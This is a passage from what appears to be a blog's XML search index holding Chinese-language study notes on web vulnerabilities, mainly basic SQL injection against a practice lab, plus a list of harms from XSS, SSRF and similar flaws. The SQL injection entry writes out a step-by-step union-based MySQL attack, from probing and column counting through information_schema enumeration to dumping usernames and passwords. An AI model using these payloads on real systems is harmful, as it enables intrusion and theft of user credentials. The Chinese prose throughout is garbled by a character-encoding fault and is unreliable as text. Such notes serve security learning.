title="ä½ç‰ˆæœ¬æ³¨å…¥é…åˆè¯»å–æˆ–æš´åŠ›"></a>ä½ç‰ˆæœ¬æ³¨å…¥é…åˆè¯»å–æˆ–æš´åŠ›</h4><p>å­—å…¸æˆ–è¯»å–</p><h3 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_30292843/article/details/99381669</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>12WEBæ¼æ´--SQLæ³¨å…¥ä¹‹ç®€è¦SQLæ³¨å…¥</title>
      <link href="/2021/09/21/12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/21/12WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨æœ¬ç³»åˆ—è¯¾ç¨‹å­¦ä¹ ä¸­ï¼ŒSQL æ³¨å…¥æ¼æ´å°†æ˜¯é‡ç‚¹éƒ¨åˆ†ï¼Œå…¶ä¸­ SQL æ³¨å…¥åˆéå¸¸å¤æ‚ï¼ŒåŒºåˆ†å„ç§æ•°æ®åº“ç±»å‹ï¼Œæäº¤æ–¹æ³•ï¼Œæ•°æ®ç±»å‹ç­‰æ³¨å…¥ï¼Œæˆ‘ä»¬éœ€è¦æŒ‰éƒ¨å°±ç­çš„å­¦ä¹ ï¼Œæ‰èƒ½å­¦ä¼šç›¸å…³ SQL æ³¨å…¥çš„æ ¸å¿ƒã€‚åŒæ ·æ­¤ç±»æ¼æ´æ˜¯WEB å®‰å…¨ä¸­ä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œå­¦ä¹ å¦‚ä½•åˆ©ç”¨ï¼ŒæŒ–æ˜ï¼Œä¿®å¤ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ã€‚</p><h3 id="SQLåŸç†"><a href="#SQLåŸç†" class="headerlink" title="SQLåŸç†"></a>SQLåŸç†</h3><p>SQLæ³¨å…¥æ˜¯ä¸€ç§è§£é‡Šæ€§è¯­è¨€ï¼Œå¦‚æœç¨‹åºä¸ç”¨æˆ·è¿›è¡Œäº¤äº’ã€‚ç”¨æˆ·å°±å¯ä»¥æ„é€ ç‰¹æ®Šçš„è¾“å…¥æ¥æ‹¼æ¥åˆ°ç¨‹åºä¸­æ‰§è¡Œï¼Œä»è€Œä½¿å¾—ç¨‹åºä¾æ®ç”¨æˆ·è¾“å…¥æ‰§è¡Œæœ‰å¯èƒ½å­˜åœ¨æ¶æ„è¡Œä¸ºçš„ä»£ç ã€‚</p><h3 id="SQLäº§ç”Ÿæ¡ä»¶ï¼š"><a href="#SQLäº§ç”Ÿæ¡ä»¶ï¼š" class="headerlink" title="SQLäº§ç”Ÿæ¡ä»¶ï¼š"></a>SQLäº§ç”Ÿæ¡ä»¶ï¼š</h3><ul><li>å¿…é¡»å¯ä»¥è¿›è¡Œè¾“å…¥</li><li>è¾“å…¥çš„å†…å®¹å¿…é¡»è¦ä¸æ•°æ®åº“è¿›è¡Œäº¤äº’</li></ul><h3 id="SQLæ³¨å…¥çš„åˆ†ç±»"><a href="#SQLæ³¨å…¥çš„åˆ†ç±»" class="headerlink" title="SQLæ³¨å…¥çš„åˆ†ç±»"></a>SQLæ³¨å…¥çš„åˆ†ç±»</h3><ul><li>ä»æ³¨å…¥æ‰‹æ³•åˆ†ç±»å¯ä»¥åˆ†ä¸ºï¼šè”åˆæŸ¥è¯¢æ³¨å…¥ã€æŠ¥é”™å‹æ³¨å…¥ã€å¸ƒå°”å‹æ³¨å…¥ã€å»¶æ—¶æ³¨å…¥ã€å †å æ³¨å…¥</li><li>ä»æ•°æ®ç±»å‹ä¸Šå¯ä»¥åˆ†ä¸ºï¼šå­—ç¬¦å‹ï¼ˆå³è¾“å…¥çš„è¾“å…¥ä½¿ç”¨ç¬¦å·è¿›è¡Œè¿‡æ»¤ï¼‰ã€æ•°å€¼å‹ï¼ˆå³è¾“å…¥çš„è¾“å…¥æœªä½¿ç”¨ç¬¦å·è¿›è¡Œè¿‡æ»¤ï¼‰</li><li>ä»æ³¨å…¥ä½ç½®å¯ä»¥åˆ†ç±»ä¸ºï¼šGETæ•°æ®ï¼ˆæäº¤æ•°æ®æ–¹å¼ä¸ºGETï¼Œå¤§å¤šå­˜åœ¨åœ°å€æ ï¼‰ã€POSTæ•°æ®ï¼ˆæäº¤æ•°æ®æ–¹å¼ä¸ºPOSTï¼Œå¤§å¤šå­˜åœ¨è¾“å…¥æ¡†ä¸­ï¼‰ã€HTTPå¤´éƒ¨ï¼ˆæäº¤æ•°æ®æ–¹å¼ä¸ºHTTPå¤´éƒ¨ï¼‰ã€cookieæ•°æ®ï¼ˆæäº¤æ•°æ®æ–¹å¼ä¸ºcookieï¼‰</li></ul><h3 id="SQLæ³¨å…¥å®‰å…¨æµ‹è¯•ä¸­å±å®³"><a href="#SQLæ³¨å…¥å®‰å…¨æµ‹è¯•ä¸­å±å®³" class="headerlink" title="SQLæ³¨å…¥å®‰å…¨æµ‹è¯•ä¸­å±å®³"></a>SQLæ³¨å…¥å®‰å…¨æµ‹è¯•ä¸­å±å®³</h3><ul><li>ç½‘ç«™æƒé™</li><li>æ•°æ®åº“æ•°æ®</li></ul><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211103956.png" alt="image-20210824195601166"></p><h3 id="MYSQLæ•°æ®åº“"><a href="#MYSQLæ•°æ®åº“" class="headerlink" title="MYSQLæ•°æ®åº“"></a>MYSQLæ•°æ®åº“</h3><p>æ³¨å…¥é¡ºåº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æ•°æ®åº“A=ç½‘ç«™A</span><br><span class="line">è¡¨å</span><br><span class="line">åˆ—å</span><br><span class="line">æ•°æ®</span><br><span class="line">æ•°æ®åº“B=ç½‘ç«™B</span><br><span class="line">.........</span><br><span class="line">æ•°æ®åº“C=ç½‘ç«™C</span><br><span class="line">..........</span><br></pre></td></tr></table></figure><h3 id="å¦‚ä½•åˆ¤æ–­æ³¨å…¥ç‚¹"><a href="#å¦‚ä½•åˆ¤æ–­æ³¨å…¥ç‚¹" class="headerlink" title="å¦‚ä½•åˆ¤æ–­æ³¨å…¥ç‚¹"></a>å¦‚ä½•åˆ¤æ–­æ³¨å…¥ç‚¹</h3><h4 id="è€åŠæ³•"><a href="#è€åŠæ³•" class="headerlink" title="è€åŠæ³•"></a>è€åŠæ³•</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 é¡µé¢æ­£å¸¸</span><br><span class="line">and 1=2 é¡µé¢é”™è¯¯</span><br><span class="line">å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹</span><br><span class="line"></span><br><span class="line">è§£é‡Š</span><br><span class="line"></span><br><span class="line">select * from users where id=1 and 1=1 limit 0,1 æ­£å¸¸</span><br><span class="line">select * from users where id=1 and 1=2 limit 0,1 é”™è¯¯</span><br><span class="line"></span><br><span class="line">å‰æ:select * from users where id=1</span><br><span class="line">è‹¥:1=1 çœŸçœŸä¸”çœŸ=çœŸ</span><br><span class="line">è‹¥:1=2 å‡çœŸä¸”å‡=å‡</span><br><span class="line">ä¸å¯ä»¥ç”¨oråˆ¤æ–­</span><br></pre></td></tr></table></figure><h4 id="å¥½ç”¨çš„ï¼ï¼"><a href="#å¥½ç”¨çš„ï¼ï¼" class="headerlink" title="å¥½ç”¨çš„ï¼ï¼"></a>å¥½ç”¨çš„ï¼ï¼</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1</span><br><span class="line">æœ€åæˆ‘ä»¬æµ‹è¯•éƒ½æ˜¯åœ¨idåé¢åŠ ä¸œè¥¿,ç„¶åidå¸¦å…¥æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢,æ‰€æœ‰æˆ‘ä»¬è¿™é‡Œå¯ä»¥éšä¾¿è¾“å…¥,å½“æ•°æ®åº“æ²¡æœ‰è¿™ä¸ªid,é¡µé¢å°±ä¼šæ”¹å˜.</span><br><span class="line">ä¾‹å¦‚:id=1è¥¿ç“œ,å¦‚æœé¡µé¢æ”¹å˜è¯´æ˜æœ‰æ³¨å…¥,å¦‚æœæ²¡æœ‰æ”¹å˜è¯´æ˜idæœ¬èº«æ²¡æœ‰è¢«å¸¦å…¥æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ã€‚</span><br><span class="line"></span><br><span class="line">ä¾‹å¤–:</span><br><span class="line">å¦‚æœä½ è¾“å…¥é”™è¯¯ç½‘ç«™ä¼šæŠ¥404,,è¿›è¡Œè·³è½¬.æ­¤ç±»ç½‘ç«™æœ‰é˜²æŠ¤,åŸºæœ¬æ²¡æœ‰æ³¨å…¥ã€‚</span><br></pre></td></tr></table></figure><h3 id="å¿…è¦çŸ¥è¯†ç‚¹"><a href="#å¿…è¦çŸ¥è¯†ç‚¹" class="headerlink" title="å¿…è¦çŸ¥è¯†ç‚¹"></a>å¿…è¦çŸ¥è¯†ç‚¹</h3><h4 id="1ã€information-chema"><a href="#1ã€information-chema" class="headerlink" title="1ã€information_chema"></a>1ã€information_chema</h4><ul><li>åœ¨Mysql 5.0ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤å®šä¹‰äº†information_schemaæ•°æ®åº“ï¼Œç”¨æ¥å­˜å‚¨æ•°æ®åº“å…ƒä¿¡æ¯ï¼Œå…¶ä¸­å…·æœ‰è¡¨schemata(æ•°æ®åº“å),tables(è¡¨æ˜),columns(åˆ—åæˆ–å­—æ®µå)</li><li>åœ¨schemataè¡¨ä¸­ï¼Œschema_nameå­—æ®µç”¨æ¥å­˜å‚¨æ•°æ®åº“åï¼Œ</li><li>åœ¨tablesè¡¨ä¸­ï¼Œtable_schemaå’Œtable_nameåˆ†åˆ«ç”¨æ¥å­˜å‚¨æ•°æ®åº“åå’Œè¡¨åã€‚</li><li>åœ¨columnsè¡¨ä¸­ï¼Œtable_schema(æ•°æ®åº“å),table_name(è¡¨å),column_name(å­—æ®µå)</li></ul><h4 id="2ã€æ•°æ®åº“ä¸­çš„â€-â€"><a href="#2ã€æ•°æ®åº“ä¸­çš„â€-â€" class="headerlink" title="2ã€æ•°æ®åº“ä¸­çš„â€.â€"></a>2ã€æ•°æ®åº“ä¸­çš„â€.â€</h4><p>æ•°æ®åº“ä¸­ç¬¦å·â€.â€ä»£è¡¨ä¸‹ä¸€çº§ï¼Œå¦‚xiao.userè¡¨ç¤ºxiaoæ•°æ®åº“ä¸­çš„userè¡¨å</p><h3 id="çŒœè§£åˆ—åæ•°é‡"><a href="#çŒœè§£åˆ—åæ•°é‡" class="headerlink" title="çŒœè§£åˆ—åæ•°é‡"></a>çŒœè§£åˆ—åæ•°é‡</h3><p>çŒœè§£åˆ—åæ•°é‡(å­—æ®µæ•°)   order by x é”™è¯¯ä¸æ­£å¸¸çš„æ­£å¸¸å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 4</span><br></pre></td></tr></table></figure><h3 id="è”åˆæ³¨å…¥"><a href="#è”åˆæ³¨å…¥" class="headerlink" title="è”åˆæ³¨å…¥"></a>è”åˆæ³¨å…¥</h3><p>æŠ¥é”™çŒœè§£å‡†å¤‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,3,4 é¡µé¢æ­£å¸¸è¯´æ˜çŒœè§£åˆ—åæ­£ç¡®</span><br><span class="line">?id=-1 union select 1,2,3,4 é€šè¿‡å°†id=-1 ä½¿åé¢çš„è¯­å¥æ‰§è¡ŒæˆåŠŸ,èƒ½å¤Ÿåœ¨é¡µé¢ä¸­å›æ˜¾çš„ä½ç½®å°†ä¼šè¢«æ•°å­—ä»£æ›¿</span><br></pre></td></tr></table></figure><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æ•°æ®åº“ç‰ˆæœ¬: version()</span><br><span class="line">æ•°æ®åº“åå­—: database()</span><br><span class="line">æ•°æ®åº“ç”¨æˆ·: user()</span><br><span class="line">æ“ä½œç³»ç»Ÿ: @@version_compile_os</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢:</span><br><span class="line">?id=-1 union select 1,database(),3,4</span><br></pre></td></tr></table></figure><h3 id="æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“åä¸‹çš„è¡¨åä¿¡æ¯"><a href="#æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“åä¸‹çš„è¡¨åä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“åä¸‹çš„è¡¨åä¿¡æ¯"></a>æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“åä¸‹çš„è¡¨åä¿¡æ¯</h3><p>æŒ‡å®šæ•°æ®åº“:mozhe_Discus_StormGroup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_shchema=&#x27;mozhe_Discus_StormGroup&#x27;</span><br></pre></td></tr></table></figure><p>è¿™æ ·æŸ¥è¯¢åªä¼šæ˜¾ç¤ºä¸€ä¸ªéœ€è¦group_concat()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_shchema=&#x27;mozhe_Discus_StormGroup&#x27;</span><br></pre></td></tr></table></figure><h3 id="æŸ¥è¯¢æŒ‡å®šè¡¨ååä¸‹çš„åˆ—åä¿¡æ¯"><a href="#æŸ¥è¯¢æŒ‡å®šè¡¨ååä¸‹çš„åˆ—åä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢æŒ‡å®šè¡¨ååä¸‹çš„åˆ—åä¿¡æ¯"></a>æŸ¥è¯¢æŒ‡å®šè¡¨ååä¸‹çš„åˆ—åä¿¡æ¯</h3><p>æŒ‡å®šè¡¨:StormGroup_member</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_shchema=&#x27;StormGroup_member&#x27;</span><br></pre></td></tr></table></figure><h3 id="æŸ¥è¯¢æŒ‡å®šæ•°æ®"><a href="#æŸ¥è¯¢æŒ‡å®šæ•°æ®" class="headerlink" title="æŸ¥è¯¢æŒ‡å®šæ•°æ®"></a>æŸ¥è¯¢æŒ‡å®šæ•°æ®</h3><p>è¿™æ ·åªèƒ½æŸ¥å‡ºä¸€éƒ¨åˆ†,æˆ–è€…åªèƒ½æŸ¥å‡ºä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,name,password,4 from mozhe_Discus_StormGroup.StormGroup_member</span><br></pre></td></tr></table></figure><p>è¿™æ ·å¯ä»¥å°†å…¨éƒ¨ä¿¡æ¯æŸ¥å‡º,ä¹Ÿå¯ä»¥ä½¿ç”¨limit 0,xè¿›è¡Œå¤šä¸ªæŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(concat_ws(0x7e,name,password)),3,4 from mozhe_Discus_StormGroup.StormGroup_member</span><br></pre></td></tr></table></figure><h3 id="æ¶‰åŠèµ„æº"><a href="#æ¶‰åŠèµ„æº" class="headerlink" title="æ¶‰åŠèµ„æº"></a>æ¶‰åŠèµ„æº</h3><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>å¿è€…å®‰å…¨æµ‹è¯•ç³»ç»Ÿ-ç¦ç”¨è½¯ç›˜å®‰è£…</p><p><a href="https://www.mozhe.cn/bug/detail/eIRHc1BCd2VlckQxbjduMG9BVCtkZz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/eIRHc1BCd2VlckQxbjduMG9BVCtkZz09bW96aGUmozhe</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11WEBæ¼æ´--å¿…æ‡‚çŸ¥è¯†</title>
      <link href="/2021/09/21/11WEB%E6%BC%8F%E6%B4%9E-%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86/"/>
      <url>/2021/09/21/11WEB%E6%BC%8F%E6%B4%9E-%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æœ¬ç« èŠ‚å°†è®²è§£å„ç§ WEB å±‚é¢ä¸Šçš„æœ‰é‚£äº›æ¼æ´ç±»å‹ï¼Œå…·ä½“æ¼æ´çš„å±å®³ç­‰çº§ï¼Œä»¥ç®€è¦çš„å½±å“èŒƒå›´æµ‹è¯•è¿›è¡Œå®ä¾‹åˆ†æï¼Œæ€ç»´å¯¼å›¾ä¸­çš„æ¼æ´ä¹Ÿ<br>æ˜¯åé¢æˆ‘ä»¬å°†è¦å­¦ä¹ åˆ°çš„å„ä¸ªçŸ¥è¯†ç‚¹ï¼Œå…¶ä¸­é’ˆå¯¹æ¼æ´çš„å½¢æˆåŸç†ï¼Œå¦‚ä½•å‘ç°ï¼Œå¦‚ä½•åˆ©ç”¨å°†æ˜¯æœ¬ç« èŠ‚å­¦ä¹ çš„é‡ç‚¹å†…å®¹ï¼</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211102644.png" alt="image-20210823141950857" style="zoom:80%;" /><h3 id="ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´å±å®³æƒ…å†µ"><a href="#ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´å±å®³æƒ…å†µ" class="headerlink" title="ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´å±å®³æƒ…å†µ"></a>ç®€è¦è¯´æ˜ä»¥ä¸Šæ¼æ´å±å®³æƒ…å†µ</h3><h4 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h4><ol><li>æ”»å‡»è€…æœªç»æˆæƒå¯ä»¥è®¿é—®æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œç›—å–ç”¨æˆ·çš„éšç§ä»¥åŠä¸ªäººä¿¡æ¯ï¼Œé€ æˆç”¨æˆ·çš„ä¿¡æ¯æ³„éœ²ã€‚</li><li>é€šè¿‡æ“ä½œæ•°æ®åº“å¯¹æŸäº›ç½‘é¡µè¿›è¡Œç¯¡æ”¹;</li><li>ä¿®æ”¹æ•°æ®åº“ä¸€äº›å­—æ®µçš„å€¼ï¼ŒåµŒå…¥ç½‘é©¬é“¾æ¥ï¼Œè¿›è¡ŒæŒ‚é©¬æ”»å‡»;æ”»å‡»è€…è¿›è€Œå¯ä»¥å¯¹ç½‘é¡µè¿›è¡Œç¯¡æ”¹ï¼Œå‘å¸ƒä¸€äº›è¿æ³•ä¿¡æ¯ç­‰ã€‚</li><li>æœåŠ¡å™¨è¢«è¿œç¨‹æ§åˆ¶ï¼Œè¢«å®‰è£…åé—¨ã€‚å¯ä»¥å¯¹æ•°æ®åº“çš„æ•°æ®è¿›è¡Œå¢åŠ æˆ–åˆ é™¤æ“ä½œï¼Œä¾‹å¦‚ç§è‡ªæ·»åŠ æˆ–åˆ é™¤ç®¡ç†å‘˜è´¦å·ã€‚</li><li>æ•°æ®åº“è¢«æ¶æ„æ“ä½œï¼šæ•°æ®åº“æœåŠ¡å™¨è¢«æ”»å‡»ï¼Œæ•°æ®åº“çš„ç³»ç»Ÿç®¡ç†å‘˜å¸æˆ·è¢«çªœæ”¹ã€‚</li><li>ç ´åç¡¬ç›˜æ•°æ®ï¼Œå¯¼è‡´å…¨ç³»ç»Ÿç˜«ç—ª;</li></ol><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><ol><li>ç½‘ç»œé’“é±¼ï¼ŒåŒ…æ‹¬ç›—å–å„ç±»ç”¨æˆ·è´¦å·ï¼›</li><li>çªƒå–ç”¨æˆ·cookiesèµ„æ–™ï¼Œä»è€Œè·å–ç”¨æˆ·éšç§ä¿¡æ¯ï¼Œæˆ–åˆ©ç”¨ç”¨æˆ·èº«ä»½è¿›ä¸€æ­¥å¯¹ç½‘ç«™æ‰§è¡Œæ“ä½œï¼›</li><li>åŠ«æŒç”¨æˆ·(æµè§ˆå™¨)ä¼šè¯ï¼Œä»è€Œæ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚è¿›è¡Œéæ³•è½¬è´¦ã€å¼ºåˆ¶å‘è¡¨æ—¥å¿—ã€å‘é€ç”µå­é‚®ä»¶ç­‰ï¼›</li><li>å¼ºåˆ¶å¼¹å‡ºå¹¿å‘Šé¡µé¢ã€åˆ·æµé‡ç­‰ï¼›</li><li>ç½‘é¡µæŒ‚é©¬ï¼Œè¿›è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä»»æ„ç¯¡æ”¹é¡µé¢ä¿¡æ¯ã€åˆ é™¤æ–‡ç« ç­‰ï¼›</li><li>è¿›è¡Œå¤§é‡çš„å®¢æˆ·ç«¯æ”»å‡»ï¼Œå¦‚DDoSæ”»å‡»ï¼›</li><li>è·å–å®¢æˆ·ç«¯ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·çš„æµè§ˆå†å²ã€çœŸå®IPã€å¼€æ”¾ç«¯å£ç­‰ï¼›</li><li>æ§åˆ¶å—å®³è€…æœºå™¨å‘å…¶ä»–ç½‘ç«™å‘èµ·æ”»å‡»ï¼›</li><li>ç»“åˆå…¶ä»–æ¼æ´ï¼Œå¦‚CSRFæ¼æ´ï¼Œå®æ–½è¿›ä¸€æ­¥ä½œæ¶ï¼›</li><li>æå‡ç”¨æˆ·æƒé™ï¼ŒåŒ…æ‹¬è¿›ä¸€æ­¥æ¸—é€ç½‘ç«™ï¼›</li><li>ä¼ æ’­è·¨ç«™è„šæœ¬è •è™«ç­‰ï¼›</li></ol><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><ul><li>æ–‡ä»¶è¯»å–</li><li>å‘½ä»¤æ‰§è¡Œ</li><li>å†…ç½‘ç«¯å£æ‰«æ</li><li>æ”»å‡»å†…ç½‘ç½‘ç«™</li><li>å‘èµ·dosæ”»å‡»ç­‰å±å®³</li></ul><h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><p>å¦‚æœ Webåº”ç”¨ç¨‹åºå­˜åœ¨ä¸Šä¼ æ¼æ´ , æ”»å‡»è€…ç”šè‡³å¯ä»¥å°†ä¸€ä¸ªwebshellç›´æ¥ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Š </p><h4 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h4><ul><li>webæœåŠ¡å™¨çš„æ–‡ä»¶è¢«å¤–ç•Œæµè§ˆå¯¼è‡´ä¿¡æ¯æ³„éœ²</li><li>è„šæœ¬è¢«ä»»æ„æ‰§è¡Œï¼Œå¯èƒ½ä¼šç¯¡æ”¹ç½‘ç«™ã€æ‰§è¡Œéæ³•æ“ä½œã€æ”»å‡»å…¶ä»–ç½‘ç«™</li></ul><h4 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h4><p>é€šè¿‡ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œå¯ä»¥ä¸‹è½½æœåŠ¡å™¨çš„ä»»æ„æ–‡ä»¶ï¼Œwebä¸šåŠ¡çš„ä»£ç ï¼ŒæœåŠ¡å™¨å’Œç³»ç»Ÿçš„å…·ä½“é…ç½®ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä¸‹è½½æ•°æ®åº“çš„é…ç½®ä¿¡æ¯ï¼Œä»¥åŠå¯¹å†…ç½‘çš„ä¿¡æ¯æ¢æµ‹ç­‰ç­‰</p><h4 id="CSRF-ç”¨æˆ·è¯·æ±‚ä¼ªé€ "><a href="#CSRF-ç”¨æˆ·è¯·æ±‚ä¼ªé€ " class="headerlink" title="CSRF(ç”¨æˆ·è¯·æ±‚ä¼ªé€ )"></a>CSRF(ç”¨æˆ·è¯·æ±‚ä¼ªé€ )</h4><p>ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·çš„å¤´åƒã€å‘è´§åœ°å€ç­‰ã€‚æ›´æœ‰ç”šè€…ï¼Œå¯èƒ½æ‰§è¡Œæ¶æ„æ“ä½œï¼Œæ¯”å¦‚ä¿® æ”¹å¯†ç ã€æ·»åŠ /åˆ é™¤å¥½å‹æˆ–è€…ç‚¹èµ/è½¬å‘/è¯„è®º/ç§ä¿¡ã€‚</p><h4 id="SSRF-æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ "><a href="#SSRF-æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ " class="headerlink" title="SSRF(æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )"></a>SSRF(æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</h4><p>æ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡é˜²ç«å¢™ç­‰è®¿é—®é™åˆ¶ï¼Œè¿›è€Œå°†å—æ„ŸæŸ“æˆ–å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨ä½œä¸ºä»£ç†è¿›è¡Œç«¯å£æ‰«æï¼Œç”šè‡³æ˜¯è®¿é—®å†…éƒ¨ç³»ç»Ÿæ•°æ®ã€‚</p><ul><li>å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„ Banner ä¿¡æ¯</li><li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰</li><li>å¯¹å†…ç½‘ Web åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°</li><li>æ”»å‡»å†…å¤–ç½‘çš„ Web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ GET å‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»</li><li>åˆ©ç”¨ file åè®®è¯»å–æœ¬åœ°æ–‡ä»¶</li></ul><h4 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" 